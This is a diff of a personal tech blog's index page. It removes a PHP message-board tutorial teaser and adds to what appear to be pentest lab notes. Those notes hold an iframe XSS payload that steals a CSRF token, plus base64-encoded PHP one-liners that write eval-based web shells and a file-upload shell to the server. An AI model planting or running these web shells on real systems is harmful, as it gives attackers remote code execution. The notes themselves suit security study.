@@ -330,158 +330,6 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/24/Create-Message-Board-with-PHP/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="chessur">
-      <meta itemprop="description" content="Freedom as Autonomy">
-      <meta itemprop="image" content="/images/cat.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="Emerald Dream">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-                
-                
-                <a href="/2019/03/24/Create-Message-Board-with-PHP/" class="post-title-link" itemprop="url">'使用PHP编写留言板'</a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-
-            
-            
-            
-
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">Posted on</span>
-              
-
-              
-                
-              
-
-              <time title="Created: 2019-03-24 15:36:54 / Modified: 21:19:08" itemprop="dateCreated datePublished" datetime="2019-03-24T15:36:54+08:00">2019-03-24</time>
-            
-
-            
-              
-
-              
-            
-          </span>
-
-          
-
-          
-            
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    
-    
-    
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          <h1 id="PHP留言板结构"><a href="#PHP留言板结构" class="headerlink" title="PHP留言板结构"></a>PHP留言板结构</h1><img src="/2019/03/24/Create-Message-Board-with-PHP/01.Structure.png">
-<h1 id="1-新建Message类"><a href="#1-新建Message类" class="headerlink" title="1.新建Message类"></a>1.新建Message类</h1><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">class Message&#123;</span><br><span class="line">	public $name;</span><br><span class="line">	public $time;</span><br><span class="line">	public $content;</span><br><span class="line"></span><br><span class="line">	function __construct($n,$t,$c)&#123;</span><br><span class="line">		$this-&gt;name=$n;</span><br><span class="line">		$this-&gt;time=$t;</span><br><span class="line">		$this-&gt;content=$c;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	function show()&#123;</span><br><span class="line">		echo &quot;Name: &quot;.$this-&gt;name.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Time: &quot;.$this-&gt;time.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;Content: &quot;.$this-&gt;content.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">		echo &quot;===========================================&quot;.&quot;&lt;br /&gt;&quot;;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
-<p>Message对象包含3个属性，name、time、content，分别是留言用户名，留言时间、留言内容。<br>在创建对象时，构造函数使将值赋给对象的3个属性。<br>show()方法则是显示留言内容。</p>
-<h1 id="2-新建MessageBoard类"><a href="#2-新建MessageBoard类" class="headerlink" title="2.新建MessageBoard类"></a>2.新建MessageBoard类</h1><img src="/2019/03/24/Create-Message-Board-with-PHP/02.MessageBoard.png">
-          <!--noindex-->
-          
-            <div class="post-button text-center">
-              <a class="btn" href="/2019/03/24/Create-Message-Board-with-PHP/#more" rel="contents">
-                Read more &raquo;
-              </a>
-            </div>
-          
-          <!--/noindex-->
-        
-      
-    </div>
-
-    
-
-    
-    
-    
-
-    
-
-    
-      
-    
-    
-
-    
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </div>
-  
-  
-  
-  </article>
-
-
-    
-      
-
-  
-
-  
-  
-  
-
-  
-
-  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
-  
-  
-  
-  <div class="post-block">
     <link itemprop="mainEntityOfPage" href="https://chirec.github.io/2019/03/21/Kail-Use-Shellinabox&Ngrok/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1308,7 +1156,7 @@
                 
                   <span class="post-meta-item-text">Edited on</span>
                 
-                <time title="Modified: 2019-07-12 20:27:04" itemprop="dateModified" datetime="2019-07-12T20:27:04+08:00">2019-07-12</time>
+                <time title="Modified: 2019-07-13 14:05:09" itemprop="dateModified" datetime="2019-07-13T14:05:09+08:00">2019-07-13</time>
               
             
           </span>
@@ -1408,6 +1256,7 @@
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;iframe src=&quot;../csrf&quot;onload=alert(frames[0].document.getElementsByName(&apos;user_token&apos;)[0].value)&gt;</span><br></pre></td></tr></table></figure>
 <h1 id="PHP伪协议"><a href="#PHP伪协议" class="headerlink" title="PHP伪协议"></a>PHP伪协议</h1><p>写一句话</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php echo `echo PD9waHAgQGV2YWwoJF9QT1NUWydXaW5keSddKT8+|base64 -d &gt; upload/1.php` ;?&gt;</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php fputs(fopen(&apos;./Windy.php&apos;,&apos;w&apos;),base64_decode(&apos;PD9waHAgZXZhbCgkX1BPU1RbV2luZHldKTs/Pg==&apos;));?&gt;</span><br></pre></td></tr></table></figure>
 <p>一句话写上传马</p>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?a=fputs(fopen(base64_decode(c2hlbGwucGhw),w),base64_decode(base64_decode(UEQ5d2FIQWdEUXBBSkhSbGJYQWdQU0FrWDBaSlRFVlRXeWQxY0d4dllXUmZabWxzWlNkZFd5ZDBiWEJmYm1GdFpTZGRPdzBLUUNSbWFXeGxJRDBnWW1GelpXNWhiV1VvSkY5R1NVeEZVMXNuZFhCc2IyRmtYMlpwYkdVblhWc25ibUZ0WlNkZEtUc05DbWxtSUNobGJYQjBlU0FvSkdacGJHVXBLWHNOQ21WamFHOGdJanhtYjNKdElHRmpkR2x2YmlBOUlDY25JRzFsZEdodlpDQTlJQ2RRVDFOVUp5QkZUa05VV1ZCRlBTZHRkV3gwYVhCaGNuUXZabTl5YlMxa1lYUmhKejVjYmlJN1pXTm9ieUFpVEc5allXd2dabWxzWlRvZ1BHbHVjSFYwSUhSNWNHVWdQU0FuWm1sc1pTY2dibUZ0WlNBOUlDZDFjR3h2WVdSZlptbHNaU2MrWEc0aU8yVmphRzhnSWp4cGJuQjFkQ0IwZVhCbElEMGdKM04xWW0xcGRDY2dkbUZzZFdVZ1BTQW5WWEJzYjJGa0p6NWNiaUk3WldOb2J5QWlQQzltYjNKdFBseHVQSEJ5WlQ1Y2JseHVQQzl3Y21VK0lqdDlaV3h6WlNCN2FXWW9iVzkyWlY5MWNHeHZZV1JsWkY5bWFXeGxLQ1IwWlcxd0xDUm1hV3hsS1NsN1pXTm9ieUFpUm1sc1pTQjFjR3h2WVdSbFpDQnpkV05qWlhOelpuVnNiSGt1UEhBK1hHNGlPMzFsYkhObElIdGxZMmh2SUNKVmJtRmliR1VnZEc4Z2RYQnNiMkZrSUNJZ0xpQWtabWxzWlNBdUlDSXVQSEErWEc0aU8zMTlQejQ9)));</span><br></pre></td></tr></table></figure>
 <figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line">@$temp = $_FILES[&apos;upload_file&apos;][&apos;tmp_name&apos;];</span><br><span class="line">@$file = basename($_FILES[&apos;upload_file&apos;][&apos;name&apos;]);</span><br><span class="line">if (empty ($file))&#123;</span><br><span class="line">echo &quot;&lt;form action = &apos;&apos; method = &apos;POST&apos; ENCTYPE=&apos;multipart/form-data&apos;&gt;\n&quot;;echo &quot;Local file: &lt;input type = &apos;file&apos; name = &apos;upload_file&apos;&gt;\n&quot;;echo &quot;&lt;input type = &apos;submit&apos; value = &apos;Upload&apos;&gt;\n&quot;;echo &quot;&lt;/form&gt;\n&lt;pre&gt;\n\n&lt;/pre&gt;&quot;;&#125;else &#123;if(move_uploaded_file($temp,$file))&#123;echo &quot;File uploaded successfully.&lt;p&gt;\n&quot;;&#125;else &#123;echo &quot;Unable to upload &quot; . $file . &quot;.&lt;p&gt;\n&quot;;&#125;&#125;?&gt;</span><br></pre></td></tr></table></figure>
@@ -1517,7 +1366,7 @@
                 
                   <a href="/archives/">
                 
-                    <span class="site-state-item-count">36</span>
+                    <span class="site-state-item-count">35</span>
                     <span class="site-state-item-name">posts</span>
                   </a>
                 </div>
